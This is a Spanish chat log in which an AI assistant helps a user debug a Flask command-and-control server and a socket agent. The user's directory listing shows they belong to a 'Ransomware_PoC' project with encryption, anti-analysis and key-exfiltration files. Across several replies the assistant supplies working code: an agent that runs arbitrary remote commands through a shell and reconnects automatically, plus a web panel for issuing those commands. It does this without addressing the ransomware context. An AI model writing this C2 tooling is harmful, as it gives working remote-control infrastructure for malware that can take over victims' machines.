# Comando agente servidor

**Created:** 3/18/2025 9:52  

## Prompt:
yo en execute command es donde meto el comando para enviar al cliente y recibir la respuesta, creo que se solapan handle connection: def handle_agent_connection(agent_socket, agent_address): # Función para manejar la ejecución de comandos en los agentes
    global connected_agents  
    try:
        agent_id = agent_socket.recv(4096).decode('utf-8').strip()
        agent_id = int(agent_id)
        print(f"Agente {agent_id} conectado desde {agent_address}")

        connected_agents[agent_id] = agent_socket
        print("Estado actual de connected_agents:", connected_agents)

        while True:
            command = agent_socket.recv(4096).decode('utf-8')
            if not command:
                print(f"Agente {agent_id} envió un comando vacío. Posible desconexión.")
                break
            elif command.lower() == "exit":
                print(f"Agente {agent_id} cerró la conexión.")
                break
            else:
                print(f"Ejecutando comando en el agente {agent_id}: {command}")
                #result = subprocess.run(command, shell=True, capture_output=True, text=True)
                #output = result.stdout if result.stdout else result.stderr
                #agent_socket.send(output.encode('utf-8'))
    except Exception as e:
        print(f"Error con el agente {agent_id}: {e}")
    finally:
        print(f"Agente {agent_id} desconectado, eliminándolo de connected_agents.")
        connected_agents.pop(agent_id, None)
        agent_socket.close()
        print("Estado actual después de la desconexión:", connected_agents)

@app.route('/execute_command/<int:agent_id>', methods=['GET', 'POST'])
def execute_command(agent_id):
    if request.method == 'POST':
        command = request.form.get('command')
        print("Enviando comando al agente:", command)
        agent_socket = connected_agents.get(agent_id)
        print(agent_socket)
        print("Conexiones activas:", connected_agents)
        if not agent_socket:
            return jsonify({'error': 'Agente no está conectado'}), 404
        agent_socket.send(command.encode('utf-8')) # Función para manejar la ejecución de comandos en los agentes
        output = agent_socket.recv(4096).decode('utf-8') # Esperar la salida del comando
        return render_template('execute_commands.html', agent_id=agent_id, output=output)
    return render_template('execute_commands.html', agent_id=agent_id)

def start_socket_server(host='0.0.0.0', port=5001): # Función para iniciar el servidor de sockets que escuchará las conexiones de los agentes
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"Servidor de sockets escuchando en {host}:{port}...")
    while True:
        agent_socket, agent_address = server_socket.accept()
        threading.Thread(target=handle_agent_connection, args=(agent_socket, agent_address)).start()

## Response:
Parece que tienes un problema de solapamiento entre `handle_agent_connection` y `execute_command`. Básicamente, en `handle_agent_connection`, recibes el comando desde el cliente (agente) y lo ejecutas, pero en `execute_command`, intentas enviar comandos desde la API Flask a un agente.

Aquí hay algunos puntos clave que podrían estar causando problemas:

1.  **Flujo de comunicación no claro:**
    
    *   `handle_agent_connection` está diseñado para recibir comandos desde el agente, pero en `execute_command`, intentas enviar comandos desde el servidor a los agentes.
        
    *   ¿El agente está enviando comandos o debería recibirlos desde el servidor?
        
2.  **El socket debe ser bidireccional:**
    
    *   En `execute_command`, envías un comando con `agent_socket.send(command.encode('utf-8'))`, pero en `handle_agent_connection`, solo lees el comando sin ejecutarlo ni devolver la respuesta al servidor.
        
    *   Necesitas asegurarte de que el agente procese el comando y devuelva la salida al servidor.
        
3.  **Manejo de desconexión:**
    
    *   Si un agente se desconecta, su socket se elimina de `connected_agents`. Pero si intentas enviarle un comando después de eso, fallará.
        

### **Posible Solución**

Dentro de `handle_agent_connection`, necesitas algo como esto para que el agente realmente ejecute el comando y devuelva la salida:

```python
import subprocess

def handle_agent_connection(agent_socket, agent_address):
    global connected_agents  
    try:
        agent_id = agent_socket.recv(4096).decode('utf-8').strip()
        agent_id = int(agent_id)
        print(f"Agente {agent_id} conectado desde {agent_address}")

        connected_agents[agent_id] = agent_socket
        print("Estado actual de connected_agents:", connected_agents)

        while True:
            command = agent_socket.recv(4096).decode('utf-8')
            if not command:
                print(f"Agente {agent_id} envió un comando vacío. Posible desconexión.")
                break
            elif command.lower() == "exit":
                print(f"Agente {agent_id} cerró la conexión.")
                break
            else:
                print(f"Ejecutando comando en el agente {agent_id}: {command}")
                
                # Ejecutar el comando en el agente
                try:
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                    output = result.stdout if result.stdout else result.stderr
                except Exception as e:
                    output = f"Error ejecutando comando: {str(e)}"

                # Enviar la respuesta de vuelta al servidor Flask
                agent_socket.send(output.encode('utf-8'))
                
    except Exception as e:
        print(f"Error con el agente {agent_id}: {e}")
    finally:
        print(f"Agente {agent_id} desconectado, eliminándolo de connected_agents.")
        connected_agents.pop(agent_id, None)
        agent_socket.close()
        print("Estado actual después de la desconexión:", connected_agents)
```

Y en `execute_command`, asegúrate de manejar la respuesta correctamente:

```python
@app.route('/execute_command/<int:agent_id>', methods=['GET', 'POST'])
def execute_command(agent_id):
    if request.method == 'POST':
        command = request.form.get('command')
        print("Enviando comando al agente:", command)
        agent_socket = connected_agents.get(agent_id)
        
        if not agent_socket:
            return jsonify({'error': 'Agente no está conectado'}), 404
        
        try:
            agent_socket.send(command.encode('utf-8'))  # Enviar el comando
            output = agent_socket.recv(4096).decode('utf-8')  # Esperar la respuesta
        except Exception as e:
            return jsonify({'error': f'Error al enviar comando: {str(e)}'}), 500
        
        return render_template('execute_commands.html', agent_id=agent_id, output=output)
    
    return render_template('execute_commands.html', agent_id=agent_id)
```

### **Resumen de los cambios**

*   `handle_agent_connection` ahora ejecuta el comando y envía la salida de vuelta.
    
*   `execute_command` maneja la respuesta y la muestra en la página.
    
*   Se maneja mejor la desconexión del agente.
    

Prueba estos cambios y dime si te sigue dando problemas. 🚀

## Prompt:
el agente debería recibir comandos desde el servidor

## Response:
Vale, entonces el problema principal es que en `handle_agent_connection`, el servidor solo está esperando recibir datos del agente, pero en realidad debería estar esperando comandos desde el servidor y enviándolos al agente para que los ejecute.

### **Flujo correcto**

1.  El agente se conecta al servidor y se registra.
    
2.  El servidor mantiene la conexión abierta y espera a enviar comandos cuando se lo soliciten desde Flask.
    
3.  Cuando un usuario envía un comando desde la API Flask, el servidor lo reenvía al agente.
    
4.  El agente ejecuta el comando y envía la salida de vuelta al servidor.
    
5.  El servidor devuelve la salida a la API Flask para mostrarla en la interfaz.
    

* * *

### **Corrección del servidor (`handle_agent_connection`)**

En lugar de esperar comandos desde el agente, el servidor debería esperar comandos desde Flask y enviárselos al agente cuando sea necesario.

```python
import socket
import threading

connected_agents = {}

def handle_agent_connection(agent_socket, agent_address):
    """ Maneja la conexión con el agente y espera comandos desde el servidor. """
    global connected_agents
    try:
        agent_id = agent_socket.recv(4096).decode('utf-8').strip()
        agent_id = int(agent_id)
        print(f"Agente {agent_id} conectado desde {agent_address}")

        connected_agents[agent_id] = agent_socket
        print("Estado actual de connected_agents:", connected_agents)

        while True:
            # Mantener la conexión abierta a la espera de comandos desde Flask
            command = agent_socket.recv(4096).decode('utf-8')
            if not command:
                print(f"Agente {agent_id} cerró la conexión.")
                break

            print(f"Agente {agent_id} ejecutó el comando: {command}")

    except Exception as e:
        print(f"Error con el agente {agent_id}: {e}")
    finally:
        print(f"Agente {agent_id} desconectado, eliminándolo de connected_agents.")
        connected_agents.pop(agent_id, None)
        agent_socket.close()
        print("Estado actual después de la desconexión:", connected_agents)

def start_socket_server(host='0.0.0.0', port=5001):
    """ Inicia el servidor de sockets para recibir conexiones de agentes """
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"Servidor de sockets escuchando en {host}:{port}...")

    while True:
        agent_socket, agent_address = server_socket.accept()
        threading.Thread(target=handle_agent_connection, args=(agent_socket, agent_address)).start()
```

* * *

### **Corrección de `execute_command`**

En la API Flask, debemos enviar el comando al agente en lugar de esperar que el agente lo envíe.

```python
from flask import Flask, request, jsonify, render_template

app = Flask(__name__)

@app.route('/execute_command/<int:agent_id>', methods=['GET', 'POST'])
def execute_command(agent_id):
    """ Enviar comandos desde el servidor al agente y recibir la respuesta """
    if request.method == 'POST':
        command = request.form.get('command')
        print(f"Enviando comando al agente {agent_id}: {command}")
        
        agent_socket = connected_agents.get(agent_id)
        if not agent_socket:
            return jsonify({'error': 'Agente no está conectado'}), 404

        try:
            # Enviar comando al agente
            agent_socket.send(command.encode('utf-8'))
            # Esperar respuesta del agente
            output = agent_socket.recv(4096).decode('utf-8')
        except Exception as e:
            return jsonify({'error': f'Error al enviar comando: {str(e)}'}), 500

        return render_template('execute_commands.html', agent_id=agent_id, output=output)

    return render_template('execute_commands.html', agent_id=agent_id)
```

* * *

### **Código del Agente**

Asegúrate de que el código del agente espera comandos desde el servidor y devuelve la salida correctamente.

```python
import socket
import subprocess

SERVER_HOST = "127.0.0.1"  # Cambia esto a la IP del servidor
SERVER_PORT = 5001

def connect_to_server():
    """ Conecta el agente al servidor y espera comandos """
    agent_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    agent_socket.connect((SERVER_HOST, SERVER_PORT))

    agent_id = "1"  # ID del agente, podrías hacerlo dinámico
    agent_socket.send(agent_id.encode('utf-8'))

    print("Conectado al servidor. Esperando comandos...")

    while True:
        command = agent_socket.recv(4096).decode('utf-8')
        if not command or command.lower() == "exit":
            print("Desconectado del servidor.")
            break

        print(f"Ejecutando comando: {command}")
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = result.stdout if result.stdout else result.stderr
        except Exception as e:
            output = f"Error ejecutando comando: {str(e)}"

        agent_socket.send(output.encode('utf-8'))

    agent_socket.close()

if __name__ == "__main__":
    connect_to_server()
```

* * *

### **Resumen de las correcciones**

✅ Ahora el servidor mantiene la conexión con el agente y espera comandos desde Flask.  
✅ `execute_command` en Flask envía comandos al agente y espera su respuesta.  
✅ El agente ejecuta los comandos recibidos y envía la salida de vuelta.

Esto debería hacer que tu sistema funcione correctamente. 🚀 Pruébalo y dime si te funciona. 💡

## Prompt:
tengo esto en el agente es correcto: import requests
import socket
import os
import json
import platform
import antianalysis
import subprocess

# Variable global para almacenar el ID del agente
agent_id = None

def get_ip_address():
    ip = socket.gethostbyname(socket.gethostname())
    return ip

def load_private_key():
    try:
        with open("rsa_private.pem", 'rb') as f:
            private_key = f.read()
        return private_key
    except FileNotFoundError:
        print("El archivo de clave privada no fue encontrado.")
        return None

# Establecer el agent_id en un archivo
def set_agent_id(id):
    with open("agent_id.json", "w") as file:
        json.dump({"agent_id": id}, file)

# Obtener el agent_id desde el archivo
def get_agent_id():
    try:
        with open("agent_id.json", "r") as file:
            data = json.load(file)
            return data.get("agent_id")
    except (FileNotFoundError, json.JSONDecodeError):
        return None


def register_agent():
    ip = get_ip_address()
    mac = antianalysis.get_mac_address()
    so = platform.system() + platform.version()
    private_key = load_private_key()

    if private_key is None:
        print("No se pudo cargar la clave privada. No se puede registrar el agente.")
        return None
    
    server_url = 'http://127.0.0.1:5000/register_agent'
    data = {
        'ip': ip,
        'mac': mac,
        'so': so 
    }
    files = {
        'private_key': ('rsa_private.pem', private_key, 'application/x-pem-file')
    }

    response = requests.post(server_url, data=data, files=files)    
    if response.status_code == 200:
        response_json = response.json()
        agent_id = response_json.get('agent_id')
        set_agent_id(agent_id)  # Guardar el ID en JSON 
        print(f"Agente registrado con éxito. ID: {agent_id}")
        os.remove("rsa_private.pem")  # Eliminar la clave privada después de transmitirla correctamente
    else:
        print(f"Error al registrar el agente: {response.text}")
        return None

def get_private_key():
    # Obtener el ID del agente desde memoria
    agent_id = get_agent_id()
    if agent_id is None:
        print("No se ha registrado un agente. No se puede obtener la clave privada.")
        return None

    server_url = f'http://127.0.0.1:5000/download_private_key/{agent_id}'
    
    # Realizar la solicitud GET para obtener el archivo .pem
    response = requests.get(server_url)
    
    if response.status_code == 200:
        # Guardar la clave privada en un archivo en el sistema del cliente
        with open('rsa_private.pem', 'wb') as f:
            f.write(response.content)
        print("Clave privada descargada con éxito.")
    else:
        print(f"Error al descargar la clave privada: {response.text}")

    # Función para conectar el agente al servidor de sockets
def connect_to_server():
    server_host = '127.0.0.1'
    server_port = 5001  

    agent_id = get_agent_id()  # Obtener el ID antes de conectarse
    if agent_id is None:
        print("Error: No se encontró el ID del agente. Regístrate primero.")
        return  

    try:
        agent_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        agent_socket.connect((server_host, server_port))
        print(f"Agente {agent_id} conectado al servidor.")

        # Enviar el agent_id al servidor al conectar
        agent_socket.send(str(agent_id).encode('utf-8'))

        while True:
            command = agent_socket.recv(1024).decode('utf-8')
            print(command)
            if command.lower() == "exit":
                break
            if command:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout if result.stdout else result.stderr
                agent_socket.send(output.encode('utf-8'))
        agent_socket.close()
    except Exception as e:
        print(f"Error al conectar al servidor: {e}")

## Response:
Tu código en el agente está bastante bien estructurado, pero hay algunos detalles que podrías mejorar o corregir:

* * *

### **✅ Aspectos positivos**:

✔️ **Registro del agente** con un servidor HTTP (`register_agent`).  
✔️ **Uso de un ID de agente** persistente con `agent_id.json`.  
✔️ **Conexión al servidor de sockets** y espera de comandos (`connect_to_server`).  
✔️ **Ejecución de comandos recibidos** y envío de la salida de vuelta.

* * *

### **🔴 Problemas y Mejoras Sugeridas**:

#### 🔹 1. **Posible error con `antianalysis.get_mac_address()`**

📌 **Problema**: No veo que hayas importado `antianalysis.get_mac_address()`. Si `antianalysis` no está instalado o es un módulo incorrecto, fallará.  
✔️ **Solución**: Usa una alternativa con `uuid` si `antianalysis` no es necesario:

```python
import uuid

def get_mac_address():
    return ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xFF) for elements in range(0, 2*6, 8)][::-1])
```

Luego, cambia en `register_agent()`:

```python
mac = get_mac_address()  # Reemplazo de antianalysis.get_mac_address()
```

* * *

#### 🔹 2. **Uso incorrecto de `os.remove("rsa_private.pem")`**

📌 **Problema**: Eliminaste la clave privada después del registro, pero luego intentas usarla en `load_private_key()`.  
✔️ **Solución**: No la borres inmediatamente o descárgala antes de cada uso.

* * *

#### 🔹 3. **El agente debería verificar si el servidor sigue activo**

📌 **Problema**: Si el servidor de sockets se desconecta, el agente debería reconectarse automáticamente en lugar de fallar.  
✔️ **Solución**: Agrega un **bucle de reconexión** en `connect_to_server()`:

```python
import time

def connect_to_server():
    server_host = '127.0.0.1'
    server_port = 5001  

    agent_id = get_agent_id()
    if agent_id is None:
        print("Error: No se encontró el ID del agente. Regístrate primero.")
        return  

    while True:  # Intentar reconectar si se pierde la conexión
        try:
            agent_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
           
```

## Prompt:
okey pero la página se me queda recargando infinitamente de execute_command.html

## Response:
Si la página `execute_command.html` se queda recargando infinitamente, el problema puede estar en **tres posibles áreas**:

### **🚨 Posibles causas**

1️⃣ **El servidor de Flask no está recibiendo la respuesta del agente**  
2️⃣ **El agente no está enviando la respuesta correctamente**  
3️⃣ **El HTML está mal configurado y está haciendo múltiples solicitudes**

* * *

### **🔍 1. Revisemos `execute_command` en Flask**

Asegúrate de que Flask está manejando correctamente la comunicación:

```python
@app.route('/execute_command/<int:agent_id>', methods=['GET', 'POST'])
def execute_command(agent_id):
    """ Enviar comando al agente y recibir respuesta """
    if request.method == 'POST':
        command = request.form.get('command')
        print(f"Enviando comando al agente {agent_id}: {command}")

        agent_socket = connected_agents.get(agent_id)
        if not agent_socket:
            return jsonify({'error': 'Agente no está conectado'}), 404

        try:
            # Enviar el comando al agente
            agent_socket.send(command.encode('utf-8'))

            # Esperar respuesta del agente (agregar timeout para evitar que quede bloqueado)
            agent_socket.settimeout(5)  # 5 segundos de espera máxima
            output = agent_socket.recv(4096).decode('utf-8')

        except socket.timeout:
            return jsonify({'error': 'El agente no respondió a tiempo'}), 504
        except Exception as e:
            return jsonify({'error': f'Error al enviar comando: {str(e)}'}), 500

        return render_template('execute_commands.html', agent_id=agent_id, output=output)

    return render_template('execute_commands.html', agent_id=agent_id)
```

✅ **Mejoras**

*   **Evita bloqueos** con `settimeout(5)`, así si el agente no responde, Flask sigue funcionando.
    
*   **Retorna errores** en JSON si algo falla.
    

* * *

### **🔍 2. El agente no está enviando respuesta**

Si el agente recibe comandos pero Flask no recibe respuesta, revisa `connect_to_server()` en el agente:

```python
def connect_to_server():
    server_host = '127.0.0.1'
    server_port = 5001  

    agent_id = get_agent_id()
    if agent_id is None:
        print("Error: No se encontró el ID del agente. Regístrate primero.")
        return  

    while True:
        try:
            agent_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            agent_socket.connect((server_host, server_port))
            print(f"Agente {agent_id} conectado al servidor.")

            agent_socket.send(str(agent_id).encode('utf-8'))

            while True:
                command = agent_socket.recv(1024).decode('utf-8')
                print(f"Recibido comando: {command}")

                if command.lower() == "exit":
                    break
                
                if command:
                    try:
                        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=5)
                        output = result.stdout if result.stdout else result.stderr
                    except subprocess.TimeoutExpired:
                        output = "Error: El comando tardó demasiado en ejecutarse."

                    # Enviar la respuesta al servidor
                    agent_socket.send(output.encode('utf-8'))

            agent_socket.close()
            print("Conexión cerrada.")
            break  # Salir del bucle si se desconecta

        except Exception as e:
            print(f"Error al conectar al servidor: {e}")
            time.sleep(5)  # Reintentar conexión en 5 segundos
```

✅ **Mejoras**

*   **Agregamos `timeout=5`** en `subprocess.run()` para evitar que se quede atascado.
    
*   **Si la conexión falla**, se reintenta después de 5 segundos.
    
*   **Imprime los comandos recibidos** para debug.
    

* * *

### **🔍 3. Posible problema en `execute_command.html`**

Si Flask y el agente están bien, el problema podría estar en el **HTML**.  
Asegúrate de que el formulario no está enviando múltiples solicitudes en bucle:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Ejecutar Comandos</title>
</head>
<body>
    <h2>Ejecutar Comando en Agente {{ agent_id }}</h2>
    
    <form id="commandForm" method="POST">
        <input type="text" name="command" required>
        <button type="submit">Ejecutar</button>
    </form>

    {% if output %}
        <h3>Salida del Comando:</h3>
        <pre>{{ output }}</pre>
    {% endif %}

    <script>
        document.getElementById("commandForm").onsubmit = function() {
            this.querySelector("button").disabled = true; // Evita múltiples envíos
        };
    </script>
</body>
</html>
```

✅ **Mejoras**

## Prompt:
te paso el log

## Response:
Sí, pásame el log y lo revisamos juntos para encontrar el problema. 🚀

## Prompt:
llega correctamente la respuesta el servidor pero no se muestra: Enviando comando al agente 1: dir
Agente 1 ejecutó el comando:  El volumen de la unidad C es Windows
 El n£mero de serie del volumen es: 2085-111E

 Directorio de C:\Users\alexander_tfg\Desktop\TFG\Ransomware_LLM\Ransomware_PoC\Client

18/03/2025  09:56    <DIR>          .
16/03/2025  12:59    <DIR>          ..
18/03/2025  09:56               256 aes_key_encrypted.bin
18/03/2025  09:40             4.044 agent_c2.py
18/03/2025  09:56                15 agent_id.json
17/03/2025  18:45             2.473 antianalysis.py
17/03/2025  18:24             3.216 decrypt.py
17/03/2025  19:19             2.904 encrypt.py
17/03/2025  18:49             2.353 find_files.py
17/03/2025  18:39               671 gen_keys.py
17/03/2025  19:20               316 main.py
18/03/2025  09:56               450 rsa_public.pem
18/03/2025  09:42    <DIR>          __pycache__
              10 archivos         16.698 bytes
               3 dirs  40.287.936.512 bytes libres

127.0.0.1 - - [18/Mar/2025 09

## Response:
Parece que el servidor **sí está recibiendo la respuesta**, pero esta no se muestra en la plantilla HTML. Vamos a depurar el problema paso a paso.

* * *

**🔎 Posibles causas y soluciones**
-----------------------------------

Aquí hay tres áreas en las que algo podría estar fallando:

1️⃣ **El `output` no se está pasando correctamente a la plantilla en Flask**  
2️⃣ **El HTML de `execute_commands.html` no está renderizando el `output`**  
3️⃣ **Flask está teniendo un error antes de renderizar la respuesta**

* * *

### **1️⃣ Verificar si Flask realmente envía `output` a la plantilla**

En tu código Flask, imprime el `output` **antes de renderizar la plantilla** para confirmar que llega bien.

📌 **Agrega `print(output)` justo antes de `render_template`**:

```python
@app.route('/execute_command/<int:agent_id>', methods=['GET', 'POST'])
def execute_command(agent_id):
    if request.method == 'POST':
        command = request.form.get('command')
        print(f"Enviando comando al agente {agent_id}: {command}")

        agent_socket = connected_agents.get(agent_id)
        if not agent_socket:
            return jsonify({'error': 'Agente no está conectado'}), 404

        try:
            agent_socket.send(command.encode('utf-8'))
            agent_socket.settimeout(5)  # Evita bloqueos
            output = agent_socket.recv(4096).decode('utf-8')
            print(f"Salida recibida del agente {agent_id}:\n{output}")  # 🔥 IMPRIME PARA DEPURAR
```

## Prompt:
este es mi html: <!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
    <style>
        body {
            margin: 40px auto; /* Margen superior de 40px y centra horizontalmente */
            width: 80%; /* Ajusta el ancho del contenido */
            max-width: 800px; /* Evita que se vuelva demasiado ancho */
            text-align: center; /* Centra el contenido en línea (como texto o elementos inline) */
        }
        .container {
            text-align: center; /* Centra el texto dentro del contenedor */
        }
    </style>
    <title>Ejecutar Comando en Agente</title>
</head>

<body>
    <div class="container">
        <h1>Ejecutar Comandos en Agente {{ agent_id }}</h1><br></br>
        {% if error %}
        <div class="error">
            <p>{{ error }}</p>
        </div>
        {% endif %}
        <form method="POST" action="{{ url_for('execute_command', agent_id=agent_id) }}">
            <div class="form-group">
                <input type="text" name="command" placeholder="Escribe el comando" class="form-control" style="font-size: 18px;" required>
            </div><br></br>
            <div class="form-group">
                <button type="submit" class="btn btn-red">Ejecutar</button>
            </div>
        </form><br></br>
        {% if output %}
        <h3>Resultado:</h3>
        <div class="output-box">
            <pre>{{ output }}</pre>
        </div>
        {% endif %}
    </div>
</body>

</html>

## Response:
Tu código HTML parece correcto en cuanto a la lógica de mostrar `output`. Si la respuesta llega al servidor pero **no se muestra en la página**, entonces el problema está en Flask.

Vamos a hacer algunas **verificaciones y correcciones clave**. 🔍

* * *

**1️⃣ Verificar que `output` llega a la plantilla**
---------------------------------------------------

En Flask, antes de renderizar la plantilla, **imprime `output`** en consola para asegurarte de que se está pasando correctamente:

```python
@app.route('/execute_command/<int:agent_id>', methods=['GET', 'POST'])
def execute_command(agent_id):
    if request.method == 'POST':
        command = request.form.get('command')
        print(f"Enviando comando al agente {agent_id}: {command}")

        agent_socket = connected_agents.get(agent_id)
        if not agent_socket:
            return render_template('execute_commands.html', agent_id=agent_id, error="Agente no está conectado")

        try:
            agent_socket.send(command.encode('utf-8'))
            agent_socket.settimeout(5)  # Evita bloqueos
            output = agent_socket.recv(4096).decode('utf-8')
            print(f"Salida recibida del agente {agent_id}:\n{output}")  # 🔥 DEPURACIÓN

        except socket.timeout:
            return render_template('execute_commands.html', agent_id=agent_id, error="El agente no respondió a tiempo")

        return render_template('execute_commands.html', agent_id=agent_id, output=output)

    return render_template('execute_commands.html', agent_id=agent_id)
```

✅ **Si ves la salida en la terminal pero no en la web**, sigue con el paso 2.

* * *

**2️⃣ Revisar el HTML generado**
--------------------------------

A veces el problema está en cómo Flask genera el HTML.

1️⃣ **Abre la consola del navegador (`F12` > "Elements")** y busca la sección:

```html
{% if output %}
    <h3>Resultado:</h3>
    <div class="output-box">
        <pre>{{ output }}</pre>
    </div>
{% endif %}
```

2️⃣ **Si `output` está vacío en el HTML, pero en Flask tiene datos**, significa que Flask **no lo está pasando bien**.

3️⃣ **Si la sección `<pre>{{ output }}</pre>` ni siquiera aparece**, Flask no está enviando `output` correctamente.

* * *

**3️⃣ Solución con redirección y `session`**
--------------------------------------------

El problema podría ser que el `POST` está redirigiendo mal. Prueba esta versión:

📌 **Corrección en Flask usando `session`**:

```python
from flask import Flask, render_template, request, redirect, url_for, session

app.secret_key = "clave_secreta"

@app.route('/execute_command/<int:agent_id>', methods=['GET', 'POST'])
def execute_command(agent_id):
    if request.method == 'POST':
        command = request.form.get('command')
        agent_socket = connected_agents.get(agent_id)

        if not agent_socket:
            session['error'] = "Agente no está conectado"
            return redirect(url_for('execute_command', agent_id=agent_id))

        try:
            agent_socket.send(command.encode('utf-8'))
            agent_socket.settimeout(5)  # Evita bloqueos
            output = agent_socket.recv(4096).decode('utf-8')
            session['output'] = output  # Guardamos en sesión

        except socket.timeout:
            session['error'] = "El agente no respondió a tiempo"
        return redirect(url_for('execute_command', agent_id=agent_id))

    output = session.pop('output', None)
    error = session.pop('error', None)
    return render_template('execute_commands.html', agent_id=agent_id, output=output, error=error)
```

### **🔹 ¿Qué cambia aquí?**

✅ **Usamos `session`** para almacenar `output`, evitando problemas con `POST`.  
✅ **Redirigimos con `redirect(url_for())`** para evitar problemas con el reenvío del formulario.

**🔄 Ahora prueba nuevamente y dime si sigue sin mostrarse la respuesta.** 🚀

## Prompt:
 Directorio de C:\Users\alexander_tfg\Desktop\TFG\Ransomware_LLM\Ransomware_PoC\Client

18/03/2025  10:05    <DIR>          .
16/03/2025  12:59    <DIR>          ..
18/03/2025  10:05               256 aes_key_encrypted.bin
18/03/2025  09:40             4.044 agent_c2.py
18/03/2025  10:05                15 agent_id.json
17/03/2025  18:45             2.473 antianalysis.py
17/03/2025  18:24             3.216 decrypt.py
17/03/2025  19:19             2.904 encrypt.py
17/03/2025  18:49             2.353 find_files.py
17/03/2025  18:39               671 gen_keys.py
17/03/2025  19:20               316 main.py
18/03/2025  10:05               450 rsa_public.pem
18/03/2025  09:42    <DIR>          __pycache__
              10 archivos         16.698 bytes
               3 dirs  40.289.292.288 bytes libres

127.0.0.1 - - [18/Mar/2025 10:05:19] "POST /execute_command/1 HTTP/1.1" 200 -
127.0.0.1 - - [18/Mar/2025 10:05:19] "GET /static/styles.css HTTP/1.1" 304 -
Error con el agente 1: timed out
Agente 1 desconectado, eliminándolo de connected_agents.
Estado actual después de la desconexión: {}

## Response:
El problema principal parece ser que el **agente se está desconectando debido a un timeout** (`Error con el agente 1: timed out`). Esto puede deberse a que:

1️⃣ **El servidor espera una respuesta, pero el agente no la envía correctamente**  
2️⃣ **El socket del agente se está cerrando antes de completar el envío de datos**  
3️⃣ **El buffer del socket no está manejando correctamente los datos grandes**

* * *

🔎 **¿Cómo solucionar esto?**
-----------------------------

### ✅ **1\. Asegurar que el agente siempre envíe una respuesta válida**

Modifica el código del agente para que, **si no hay salida de comando, al menos envíe un mensaje vacío**.

📌 **Corrección en `agent_c2.py`** (dentro del `while True` del socket):

```python
while True:
    try:
        command = agent_socket.recv(1024).decode('utf-8')
        print(f"Recibido comando: {command}")

        if command.lower() == "exit":
            break

        if command:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = result.stdout if result.stdout else result.stderr
            
            if not output:
                output = "[Sin salida]"

            print(f"Enviando salida al servidor:\n{output}")
            agent_socket.send(output.encode('utf-8'))
    
    except Exception as e:
        print(f"Error en el agente: {e}")
        break
```

**¿Qué cambia aquí?**  
✅ **Si el comando no genera salida**, enviamos `"[Sin salida]"`, evitando que el servidor se bloquee.  
✅ **Manejamos errores para evitar que el socket se cierre abruptamente**.

* * *

### ✅ **2\. Asegurar que el servidor espera correctamente la respuesta**

📌 **Corrección en `execute_command` en Flask**  
Modifica el código del servidor para manejar **timeouts y evitar bloqueos**:

```python
@app.route('/execute_command/<int:agent_id>', methods=['GET', 'POST'])
def execute_command(agent_id):
    if request.method == 'POST':
        command = request.form.get('command')
        agent_socket = connected_agents.get(agent_id)

        if not agent_socket:
            return render_template('execute_commands.html', agent_id=agent_id, error="Agente no está conectado")

        try:
            agent_socket.send(command.encode('utf-8'))
            agent_socket.settimeout(10)  # ⏳ Aumentamos timeout para evitar desconexión

            output = agent_socket.recv(4096).decode('utf-8')
            print(f"Salida recibida:\n{output}")  # 🔥 Verificar si llega la respuesta correctamente

        except socket.timeout:
            output = "[Error: El agente no respondió a tiempo]"

        return render_template('execute_commands.html', agent_id=agent_id, output=output)

    return render_template('execute_commands.html', agent_id=agent_id)
```

* * *

### **🎯 Con estos cambios, ahora deberías ver la salida correctamente en la página.**

Prueba y dime si sigues teniendo el problema. 🚀



---
